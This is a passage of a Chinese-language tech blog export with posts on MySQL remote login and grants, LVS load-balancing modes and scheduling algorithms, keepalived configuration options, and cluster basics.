&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当给mysql设置密码后再去连接，就需要加上-p选项了 1[root@lamp ~]# mysql -uroot -pyanyi -h127.0.0.1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其中-h指定ip，如果是远程机器，则-h后面跟远程服务器ip，默认port是3306，如果是其他端口，需要用-P来定义 1[root@lamp ~]# mysql -uroot -pyanyi -h127.0.0.1 -P3306 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;另外有时候还需要mysql授权客户机，要不无法登录 123[root@lamp ~]# mysql -uroot -pyanyimysql&gt; grant all on *.* to 'root'@'192.168.0.99' identified by '112233' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;all就是所有权限。.前边的*表示所有的库，后边的*表示所有的表，这里就是所有的库和所有的表。’root’@’192.168.99’ root表示授权给root，192.168.0.99是客户端ip，授权哪个客户端IP。identifined by 后边跟的密码 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;查看 12mysql&gt; use mysqlmysql&gt; selct * from user where host='192.168.0.99'\G; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;再次连接 1[root@lamp ~]# mysql -uroot -h192.168.0.99 -p112233 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这里-p选项跟的密码是授权设置的密码，不是root的密码。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;登录以后查看一下当前登录用户 1mysql&gt; select user(); &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用户是 root@192.168.0.99 socket方式&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这种只适合连接本机的mysql： 1[root@lamp ~]# mysql -uroot -S /tmp/mysql.sock -pyanyi &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这里的-S可以省略掉。]]></content>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LB 集群之 LVS 介绍]]></title>
    <url>%2F2017%2F08%2F10%2FLVS%2F13.%20LB%20%E9%9B%86%E7%BE%A4%E4%B9%8B%20LVS%20%E4%BB%8B%E7%BB%8D%2F</url>
    <content type="text"><![CDATA[LB 集群之 LVS 介绍&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;LB 集群是 load balance 集群的简写，翻译成中文就是负载均衡集群。常用的负载均衡开源软件有 nginx 、lvs 、keepalived ，商业的硬件负载设备 F5 、Netscale 。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;LB 集群的架构如下图，原理也很简单，就是当用户的请求过来时，会直接发到分发器（Director Server）上，然后它把用户的请求根据预先设置好的算法，智能均衡地分发到后端的真正服务器（real server）上。如果不同的机器，可能用户请求到的数据不一样，为了避免这样的情况发生，所以用到了共享存储，这样保证所有用户请求的数据是一样的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;LVS 是一个实现负载均衡集群的开源软件项目，LVS 架构从罗技上可分为调度层（Director）、server 集群层（real server）和共享存储。 LVS 从实现上分为下面三种模式。 NAT （调度器将请求的目标 ip 即 vip 地址改为 real server 的 ip ，返回的数据包也经过调度器，调度器再把源地址修改为 vip）。 TUN （调度器将请求来的数据包封装加密通过 ip 隧道转发到后端的 real server 上，而 real server 会直接把数据返回给客户端，而不再经过调度器）。 DR （调度器将请求来的数据包的目标 mac 地址改为 real server 的 mac 地址，返回的时候也不经过调度器，直接返回给客户端）。参考资料LVS原理详解及部署之二：LVS原理详解（3种工作方式8种调度算法） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;图中出现的几个 IP 概念，需要解释一下，其中 DIP（driector ip）为分发器的 IP， NAT 模式下它必须为公网 IP ，要对外服务。VIP （virtual ip）为虚拟 IP ，用在 TUN 和 DR 模式中，需要同时配置在分发器和后端真实服务器上。RIP （Resl IP）为后端真实服务器的 IP ，在 TUN 和 DR 模式中，RIP 为公网 IP。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;要想把用户的请求调度给后端的 RS ,是需要经过调度算法来实现的，那么关于 LVS 的调度算法，都有哪些？ 轮叫调度（Round Robin）（简称 rr），这种算法是最简单的，不管后端 RS 配置和处理能力，非常均衡地分发下去。 加权调度（Weighted Round Robin）（简称 wrr），比上面的算法多了一个权重的概念，可以给 RS 设置权重，权重越高，那么分发的请求越多，权重取值范围 0-100 最少连接（least connection）（LC），这个算法会根据后端 RS 的连接数来决定把请求分给谁，比如 RS1 连接数比 RS2 连接数少，那么请求就优先发给 - 加权最少链接（Weighted Least Connections）（WLC），比第三个算法多了一个权重的概念。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其他算法参考LVS调度算法]]></content>
      <tags>
        <tag>LVS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LVS调度算法]]></title>
    <url>%2F2017%2F08%2F10%2FLVS%2F14.%20LVS%E8%B0%83%E5%BA%A6%E7%AE%97%E6%B3%95%2F</url>
    <content type="text"><![CDATA[LVS调度算法&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;LVS主要的调度算法 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;轮询调度-加权轮询调度-最小连接调度-加权最小连接调度-基于局部性的最少连接-带复制的基于局部性的最少连接-目标地址散列调度-源地址散列调度 轮询算法(RR)就是按依次循环的方式将请求调度到不同的服务器上，该算法最大的特点就是实现简单。轮询算法假设所有的服务器处理请求的能力都是一样的，调度器会将所有的请求平均分配给每个真实服务器 加权轮询算法(WRR)主要是对轮询算法的一种优化与补充，LVS会考虑每台服务器的性能，并给每台服务器添加一个权值，如果服务器A的权值为1，服务器B的权值为2，则调度到服务器B的请求会是服务器A的两倍。权值越高的服务器，处理的请求越多。 最小连接调度算法(LC)将把请求调度到连续数量最小的服务器上， 加权最小连接算法(WLC)则是给每台服务器一个权值，调度器会尽可能保持服务器连接数量与权值之间的平衡 基于局部性的最少连接调度算法(lblc)是请求数据包的目标IP地址的一种调度算法，该算法先根据请求的目标IP地址寻找最近的该目标IP地址所有使用的服务器，如果这台服务器依然可用，并且用能力处理该请求，调度器会尽量选择相同的服务器，否则会继续选择其他可行的服务器。 带复杂的基于局部性最少的连接算法(lblcr)激励的不是一个目标IP与一台服务器之间的连接记录，他会维护一个目标IP到一组服务器之间的映射关系，防止单点服务器负责过高 目标地址散列调度算法(DH)也是根据目标IP地址通过散列函数将目标IP与服务器建立映射关系，出现服务器不可用或负载过高的情况下，发往该目标IP的请求会固定发给该服务器。 源地址散列调度算法(SH)与目标地址散列调度算法类似，但它是根据源地址散列算法进行静态分配固定的服务器资源]]></content>
      <tags>
        <tag>LVS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[keepalived 工作原理和配置说明]]></title>
    <url>%2F2017%2F08%2F10%2FLVS%2F6.%20keepalived%20%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E5%92%8C%E9%85%8D%E7%BD%AE%E8%AF%B4%E6%98%8E%2F</url>
    <content type="text"><![CDATA[keepalived 工作原理和配置说明keepalived是什么&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;keepalived是集群管理中保证集群高可用的一个服务软件，其功能类似于heartbeat，用来防止单点故障。 keepalived工作原理&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;keepalived是以VRRP协议为实现基础的，VRRP全称Virtual Router Redundancy Protocol，即虚拟路由冗余协议。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;虚拟路由冗余协议，可以认为是实现路由器高可用的协议，即将N台提供相同功能的路由器组成一个路由器组，这个组里面有一个master和多个backup，master上面有一个对外提供服务的vip（该路由器所在局域网内其他机器的默认路由为该vip），master会发组播，当backup收不到vrrp包时就认为master宕掉了，这时就需要根据VRRP的优先级来选举一个backup当master。这样的话就可以保证路由器的高可用了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;keepalived主要有三个模块，分别是core、check和vrrp。core模块为keepalived的核心，负责主进程的启动、维护以及全局配置文件的加载和解析。check负责健康检查，包括常见的各种检查方式。vrrp模块是来实现VRRP协议的。 keepalived的配置文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;keepalived只有一个配置文件keepalived.conf，里面主要包括以下几个配置区域，分别是global_defs、static_ipaddress、static_routes、vrrp_script、vrrp_instance和virtual_server。 global_defs区域&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;主要是配置故障发生时的通知对象以及机器标识 123456789101112global_defs &#123; notification_email &#123; a@abc.com b@abc.com ... &#125; notification_email_from alert@abc.com smtp_server smtp.abc.com smtp_connect_timeout 30 enable_traps router_id host163&#125; notification_email 故障发生时给谁发邮件通知。 notification_email_from 通知邮件从哪个地址发出。 smpt_server 通知邮件的smtp地址。 smtp_connect_timeout 连接smtp服务器的超时时间。 enable_traps 开启SNMP陷阱（Simple Network Management Protocol）。 router_id 标识本节点的字条串，通常为hostname，但不一定非得是hostname。故障发生时，邮件通知会用到。 static_ipaddress和static_routes区域&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;static_ipaddress和static_routes区域配置的是是本节点的IP和路由信息。如果你的机器上已经配置了IP和路由，那么这两个区域可以不用配置。其实，一般情况下你的机器都会有IP地址和路由信息的，因此没必要再在这两个区域配置。 12345678static_ipaddress &#123; 10.210.214.163/24 brd 10.210.214.255 dev eth0 ...&#125;static_routes &#123; 10.0.0.0/8 via 10.210.214.1 dev eth0 ...&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以上分别表示启动/关闭keepalived时在本机执行的如下命令： 1234/sbin/ip addr add 10.210.214.163/24 brd 10.210.214.255 dev eth0/sbin/ip route add 10.0.0.0/8 via 10.210.214.1 dev eth0/sbin/ip addr del 10.210.214.163/24 brd 10.210.214.255 dev eth0/sbin/ip route del 10.0.0.0/8 via 10.210.214.1 dev eth0 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意： 请忽略这两个区域，因为我坚信你的机器肯定已经配置了IP和路由。 vrrp_script区域&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用来做健康检查的，当时检查失败时会将vrrp_instance的priority减少相应的值。 123456789101112vrrp_script check_alive&#123; script "/export/sh/check_nginx_alive.sh" # check every 2 seconds interval 2 # if failed, decrease 10 of the priority weight -10 # require 2 failures for failures fail 2 # require 1 sucesses for ok rise 1&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以上意思是如果script中的指令执行失败，那么相应的vrrp_instance的优先级会减少10个点。 vrrp_instance和vrrp_sync_group区域&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;vrrp_instance用来定义对外提供服务的VIP区域及其相关属性。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;vrrp_rsync_group用来定义vrrp_intance组，使得这个组内成员动作一致。举个例子来说明一下其功能： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;两个vrrp_instance同属于一个vrrp_rsync_group，那么其中一个vrrp_instance发生故障切换时，另一个vrrp_instance也会跟着切换（即使这个instance没有发生故障）。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152vrrp_sync_group VG_1 &#123; group &#123; inside_network # name of vrrp_instance (below) outside_network # One for each moveable IP. ... &#125; notify_master /path/to_master.sh notify_backup /path/to_backup.sh notify_fault "/path/fault.sh VG_1" notify /path/notify.sh smtp_alert&#125;vrrp_instance VI_1 &#123; state MASTER interface eth0 use_vmac dont_track_primary track_interface &#123; eth0 eth1 &#125; mcast_src_ip lvs_sync_daemon_interface eth1 garp_master_delay 10 virtual_router_id 1 priority 100 advert_int 1 authentication &#123; auth_type PASS auth_pass 12345678 &#125; virtual_ipaddress &#123; 10.210.214.253/24 brd 10.210.214.255 dev eth0 192.168.1.11/24 brd 192.168.1.255 dev eth1 &#125; virtual_routes &#123; 172.16.0.0/12 via 10.210.214.1 192.168.1.0/24 via 192.168.1.1 dev eth1 default via 202.102.152.1 &#125; track_script &#123; chk_http_port &#125; nopreempt preempt_delay 300 debug notify_master | notify_backup | notify_fault | notify | smtp_alert&#125; notify_master/backup/fault 分别表示切换为主/备/出错时所执行的脚本。 notify 表示任何一状态切换时都会调用该脚本，并且该脚本在以上三个脚本执行完成之后进行调用，keepalived会自动传递三个参数（$1 = “GROUP”|”INSTANCE”，$2 = name of group or instance，$3 = target state of transition(MASTER/BACKUP/FAULT)）。 smtp_alert 表示是否开启邮件通知（用全局区域的邮件设置来发通知）。 state 可以是MASTER或BACKUP，不过当其他节点keepalived启动时会将priority比较大的节点选举为MASTER，因此该项其实没有实质用途。 interface 节点固有IP（非VIP）的网卡，用来发VRRP包。 use_vmac 是否使用VRRP的虚拟MAC地址。 dont_track_primary 忽略VRRP网卡错误。（默认未设置） track_interface 监控以下网卡，如果任何一个不通就会切换到FALT状态。（可选项） mcast_src_ip 修改vrrp组播包的源地址，默认源地址为master的IP。（由于是组播，因此即使修改了源地址，该master还是能收到回应的） lvs_sync_daemon_interface 绑定lvs syncd的网卡。 garp_master_delay 当切为主状态后多久更新ARP缓存，默认5秒。 virtual_router_id 取值在0-255之间，用来区分多个instance的VRRP组播。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意： 同一网段中virtual_router_id的值不能重复，否则会出错，相关错误信息如下。 12345Keepalived_vrrp[27120]: ip address associated with VRID not present in received packet :one or more VIP associated with VRID mismatch actual MASTER advertbogus VRRP packet received on eth1 !!!receive an invalid ip number count associated with VRID!VRRP_Instance(xxx) ignoring received advertisment... &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以用这条命令来查看该网络中所存在的vrid： 1tcpdump -nn -i any net 224.0.0.0/8 priority 用来选举master的，要成为master，那么这个选项的值最好高于其他机器50个点，该项取值范围是1-255（在此范围之外会被识别成默认值100）。 advert_int 发VRRP包的时间间隔，即多久进行一次master选举（可以认为是健康查检时间间隔）。 authentication 认证区域，认证类型有PASS和HA（IPSEC），推荐使用PASS（密码只识别前8位）。 virtual_ipaddress vip，不解释了。 virtual_routes 虚拟路由，当IP漂过来之后需要添加的路由信息。 virtual_ipaddress_excluded 发送的VRRP包里不包含的IP地址，为减少回应VRRP包的个数。在网卡上绑定的IP地址比较多的时候用。 nopreempt 允许一个priority比较低的节点作为master，即使有priority更高的节点启动。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先nopreemt必须在state为BACKUP的节点上才生效（因为是BACKUP节点决定是否来成为MASTER的），其次要实现类似于关闭auto failback的功能需要将所有节点的state都设置为BACKUP，或者将master节点的priority设置的比BACKUP低。我个人推荐使用将所有节点的state都设置成BACKUP并且都加上nopreempt选项，这样就完成了关于autofailback功能，当想手动将某节点切换为MASTER时只需去掉该节点的nopreempt选项并且将priority改的比其他节点大，然后重新加载配置文件即可（等MASTER切过来之后再将配置文件改回去再reload一下）。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当使用track_script时可以不用加nopreempt，只需要加上preempt_delay 5，这里的间隔时间要大于vrrp_script中定义的时长。 preempt_delay master启动多久之后进行接管资源（VIP/Route信息等），并提是没有nopreempt选项。 virtual_server_group和virtual_server区域&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;virtual_server_group一般在超大型的LVS中用到，一般LVS用不过这东西，因此不多说。 123456789101112131415161718192021222324252627282930313233343536virtual_server IP Port &#123; delay_loop lb_algo rr|wrr|lc|wlc|lblc|sh|dh lb_kind NAT|DR|TUN persistence_timeout persistence_granularity protocol TCP ha_suspend virtualhost alpha omega quorum hysteresis quorum_up | quorum_down | sorry_server real_server &#123; weight inhibit_on_failure notify_up | notify_down | # HTTP_GET|SSL_GET|TCP_CHECK|SMTP_CHECK|MISC_CHECK HTTP_GET|SSL_GET &#123; url &#123; path # Digest computed with genhash digest status_code &#125; connect_port connect_timeout nb_get_retry delay_before_retry &#125; &#125;&#125; delay_loop 延迟轮询时间（单位秒）。 lb_algo 后端调试算法（load balancing algorithm）。 lb_kind LVS调度类型NAT/DR/TUN。 virtualhost 用来给HTTP_GET和SSL_GET配置请求header的。 sorry_server 当所有real server宕掉时，sorry server顶替。 real_server 真正提供服务的服务器。 weight 权重。 notify_up/down 当real server宕掉或启动时执行的脚本。 健康检查的方式，N多种方式。 path 请求real serserver上的路径。 digest/status_code 分别表示用genhash算出的结果和http状态码。 connect_port 健康检查，如果端口通则认为服务器正常。 connect_timeout,nb_get_retry,delay_before_retry分别表示超时时长、重试次数，下次重试的时间延迟。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其他选项暂时不作说明。 keepalived主从切换&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;主从切换比较让人蛋疼，需要将backup配置文件的priority选项的值调整的比master高50个点，然后reload配置文件就可以切换了。当时你也可以将master的keepalived停止，这样也可以进行主从切换。 keepalived仅做HA时的配置&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;请看该文档同级目录下的配置文件示例。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;10.210.214.113 为keepalived的备机，其配置文件为113.keepalived.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;10.210.214.163 为keepalived的主机，其配置文件为163.keepalived.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;10.210.214.253 为Virtual IP，即提供服务的内网IP地址，在网卡eth0上面 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;192.168.1.11 为模拟的提供服务的公网IP地址，在网卡eth1上面 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用tcpdump命令来捕获的结果如下： 117:20:07.919419 IP 10.210.214.163&gt;224.0.0.18:VRRPv2,Advertisement, vrid 1, prio 200, authtype simple, intvl 1s, length 20 LVS+Keepalived配置&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注Keepalived与LVS结合使用时一般还会用到一个工具ipvsadm，用来查看相关VS相关状态，关于ipvsadm的用法可以参考man手册。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;10.67.15.95为keepalived master，VIP为10.67.15.94，配置文件为95-lvs-keepalived.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;10.67.15.96为keepalived master，VIP为10.67.15.94，配置文件为96-lvs-keepalived.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;10.67.15.195为real server &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当使用LVS+DR+Keepalived配置时，需要在real server上添加一条iptables规则（其中dport根据情况添加或缺省）： 1# iptables -t nat -A PREROUTING -p tcp -d 10.67.15.94 --dport 80 -j REDIRECT &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当使用LVS+NAT+Keepalived配置时，需要将real server的默认路由配置成Director的VIP10.67.15.94，必须确保client的请求是通过10.67.15.94到达real server的。 安装keepalived&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从keepalived官网下载合适的版本，解压并执行如下命令完成安装。 1# cd keepalived-xxx# ./configure --bindir=/usr/bin --sbindir=/usr/sbin --sysconfdir=/etc --mandir=/usr/share# make &amp;&amp; make install &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;也可以打成RPM包，然后安装。 说明&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用到的HA场景如下： 两台主机host113和host163，内网IP在eth1网卡上，分别是10.210.214.113和10.210.214.163，VIP为公网IP在eth0上，IP地址是202.102.152.253，网关为202.102.152.1。当VIP在host113上提供服务时，host113上的默认路由为202.102.152.1，提供服务的端口为202.102.152.253:443。host113发生故障需要将VIP及服务切回到host163上的时候，需要以下几步，第一将VIP接管过来，第二添加默认路由202.102.152.1，第三启动在端口202.102.152.253:443上的服务。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如此一来，keepalived需要另外的脚本来完成添加默认路由和启动服务工作，这点和heartbeat中的resources是相同的。目前我进行了测试，发现keepalived速度要比heartbeat快，也就是说效率比heartbeat高。并且，最重要的一点，keepalived支持多个backup。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;不要问为何有以上需求。要为两个不同的域名提供https服务，由于SSL证书问题，必须有两个公网IP地址分别绑定443端口。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当然，通过SNI也可以实现一个公网IP绑定443端口来为多个域名提供https服务，但是这需要浏览器支持（M$的IE浏览器不支持）。（nginx/apache） 吐槽&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;keepalived的主从切换比较让人蛋疼，需要修改配置文件或停止一方的运行。但是由于keepalived是通过vrrp协议来实现failover（故障转移）的，因此也决定了手动主从切换的不便。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;keepalived的文档也很旧了，一直都找不到合适的文档，之我就一直忽略了vrrp_script这个区域，导致很多事情想不通。 参考资料 http://www.linuxvirtualserver.org/ http://www.keepalived.org/LVS-NAT-Keepalived-HOWTO.html]]></content>
      <tags>
        <tag>LVS</tag>
        <tag>keepalived</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LVS原理详解及部署之二：LVS原理详解（3种工作方式8种调度算法）]]></title>
    <url>%2F2017%2F08%2F10%2FLVS%2F9.%20LVS%E5%8E%9F%E7%90%86%E8%AF%A6%E8%A7%A3%E5%8F%8A%E9%83%A8%E7%BD%B2%E4%B9%8B%E4%BA%8C%EF%BC%9ALVS%E5%8E%9F%E7%90%86%E8%AF%A6%E8%A7%A3%EF%BC%883%E7%A7%8D%E5%B7%A5%E4%BD%9C%E6%96%B9%E5%BC%8F8%E7%A7%8D%E8%B0%83%E5%BA%A6%E7%AE%97%E6%B3%95%EF%BC%89%2F</url>
    <content type="text"><![CDATA[LVS原理详解及部署之二：LVS原理详解（3种工作方式8种调度算法）一、集群简介什么是集群&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;计算机集群简称集群是一种计算机系统，它通过一组松散集成的计算机软件和/或硬件连接起来高度紧密地协作完成计算工作。在某种意义上，他们可以被看作是一台计算机。集群系统中的单个计算机通常称为节点，通常通过局域网连接，但也有其它的可能连接方式。集群计算机通常用来改进单个计算机的计算速度和/或可靠性。一般情况下集群计算机比单个计算机，比如工作站或超级计算机性能价格比要高得多。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;集群就是一组独立的计算机，通过网络连接组合成一个组合来共同完一个任务 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;LVS在企业架构中的位置： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以上的架构只是众多企业里面的一种而已。绿色的线就是用户访问请求的数据流向。用户–&gt;LVS负载均衡服务器—&gt;apahce服务器—&gt;mysql服务器&amp;memcache服务器&amp;共享存储服务器。并且我们的mysql、共享存储也能够使用LVS再进行负载均衡。 小结&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;集群：就是一组相互独立的计算机，通过高速的网络组成一个计算机系统，每个集群节点都是运行其自己进程的一个独立服务器。对网络用户来讲，网站后端就是一个单一的系统，协同起来向用户提供系统资源，系统服务。 为什么要使用集群集群的特点 高性能performance。一些需要很强的运算处理能力比如天气预报，核试验等。这就不是几台计算机能够搞定的。这需要上千台一起来完成这个工作的。 价格有效性：通常一套系统集群架构，只需要几台或数十台服务器主机即可，与动则上百王的专用超级计算机具有更高的性价比。 可伸缩性：当服务器负载压力增长的时候，系统能够扩展来满足需求，且不降低服务质量。 高可用性：尽管部分硬件和软件发生故障，整个系统的服务必须是7*24小时运行的。 集群的优势 透明性：如果一部分服务器宕机了业务不受影响，一般耦合度没有那么高，依赖关系没有那么高。比如NFS服务器宕机了其他就挂载不了了，这样依赖性太强。 高性能：访问量增加，能够轻松扩展。 可管理性：整个系统可能在物理上很大，但很容易管理。 可编程性：在集群系统上，容易开发应用程序，门户网站会要求这个。 集群分类及不同分类的特点&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;计算机集群架构按照功能和结构一般分成以下几类： 负载均衡集群（Loadbalancingclusters）简称LBC 高可用性集群（High-availabilityclusters）简称HAC 高性能计算集群（High-perfomanceclusters）简称HPC 网格计算（Gridcomputing） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;网络上面一般认为是有三个，负载均衡和高可用集群式我们互联网行业常用的集群架构。 负载均衡集群&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;负载均衡集群为企业提供了更为实用，性价比更高的系统架构解决方案。负载均衡集群把很多客户集中访问的请求负载压力可能尽可能平均的分摊到计算机集群中处理。客户请求负载通常包括应用程度处理负载和网络流量负载。这样的系统非常适合向使用同一组应用程序为大量用户提供服务。每个节点都可以承担一定的访问请求负载压力，并且可以实现访问请求在各节点之间动态分配，以实现负载均衡。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;负载均衡运行时，一般通过一个或多个前端负载均衡器将客户访问请求分发到后端一组服务器上，从而达到整个系统的高性能和高可用性。这样计算机集群有时也被称为服务器群。一般高可用性集群和负载均衡集群会使用类似的技术，或同时具有高可用性与负载均衡的特点。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;负载均衡集群的作用 分担访问流量（负载均衡） 保持业务的连续性（高可用） 高可用性集群&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一般是指当集群中的任意一个节点失效的情况下，节点上的所有任务自动转移到其他正常的节点上，并且此过程不影响整个集群的运行，不影响业务的提供。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;类似是集群中运行着两个或两个以上的一样的节点，当某个主节点出现故障的时候，那么其他作为从 节点的节点就会接替主节点上面的任务。从节点可以接管主节点的资源（IP地址，架构身份等），此时用户不会发现提供服务的对象从主节点转移到从节点。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;高可用性集群的作用：当一个机器宕机另一台进行接管。比较常用的高可用集群开源软件有：keepalive，heardbeat。 高性能计算集群&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;高性能计算集群采用将计算任务分配到集群的不同计算节点儿提高计算能力，因而主要应用在科学计算领域。比较流行的HPC采用Linux操作系统和其它一些免费软件来完成并行运算。这一集群配置通常被称为Beowulf集群。这类集群通常运行特定的程序以发挥HPCcluster的并行能力。这类程序一般应用特定的运行库, 比如专为科学计算设计的MPI库。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;HPC集群特别适合于在计算中各计算节点之间发生大量数据通讯的计算作业，比如一个节点的中间结果或影响到其它节点计算结果的情况。 常用集群软硬件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;常用开源集群软件有：lvs，keepalived，haproxy，nginx，apache，heartbeat &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;常用商业集群硬件有：F5,Netscaler，Radware，A10等 二、LVS负载均衡集群介绍&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;负载均衡集群的作用：提供一种廉价、有效、透明的方法，来扩展网络设备和服务器的负载带宽、增加吞吐量，加强网络数据处理能力、提高网络的灵活性和可用性。 把单台计算机无法承受的大规模的并发访问或数据流量分担到多台节点设备上分别处理，减少用户等待响应的时间，提升用户体验。 单个重负载的运算分担到多台节点设备上做并行处理，每个节点设备处理结束后，将结果汇总，返回给用户，系统处理能力得到大幅度提高。 7*24小时的服务保证，任意一个或多个设备节点设备宕机，不能影响到业务。在负载均衡集群中，所有计算机节点都应该提供相同的服务，集群负载均衡获取所有对该服务的如站请求。 LVS介绍&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;LVS是linux virtual server的简写linux虚拟服务器，是一个虚拟的服务器集群系统，可以再unix/linux平台下实现负载均衡集群功能。该项目在1998年5月由章文嵩博士组织成立。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以下是LVS官网提供的4篇文章：（非常详细） http://www.linuxvirtualserver.org/zh/lvs1.html http://www.linuxvirtualserver.org/zh/lvs2.html http://www.linuxvirtualserver.org/zh/lvs3.html http://www.linuxvirtualserver.org/zh/lvs4.html IPVS发展史&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;早在2.2内核时，IPVS就已经以内核补丁的形式出现。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从2.4.23版本开始ipvs软件就是合并到linux内核的常用版本的内核补丁的集合。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从2.4.24以后IPVS已经成为linux官方标准内核的一部分 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从上图可以看出lpvs是工作在内核层，我们不能够直接操作ipvs，vs负载均衡调度技术是在linux内核中实现的。因此，被称之为linux虚拟服务器。我们使用该软件配置lvs的时候，不能直接配置内核中的ipvs，而需要使用ipvs的管理工具ipvsadm进行管理。通过keepalived也可以管理LVS。 LVS体系结构与工作原理简单描述&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;LVS集群负载均衡器接受服务的所有入展客户端的请求，然后根据调度算法决定哪个集群节点来处理回复客户端的请求。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;LVS虚拟服务器的体系如下图所示，一组服务器通过高速的局域网或者地理分布的广域网相互连接，在这组服务器之前有一个负载调度器（load balance）。负载调度器负责将客户的请求调度到真实服务器上。这样这组服务器集群的结构对用户来说就是透明的。客户访问集群系统就如只是访问一台高性能，高可用的服务器一样。客户程序不受服务器集群的影响，不做任何修改。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;就比如说：我们去饭店吃饭点菜，客户只要跟服务员点菜就行。并不需要知道具体他们是怎么分配工作的，所以他们内部对于我们来说是透明的。此时这个服务员就会按照一定的规则把他手上的活，分配到其他人员上去。这个服务员就是负载均衡器（LB）而后面这些真正做事的就是服务器集群。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;底下是官网提供的结构图： LVS的基本工作过程 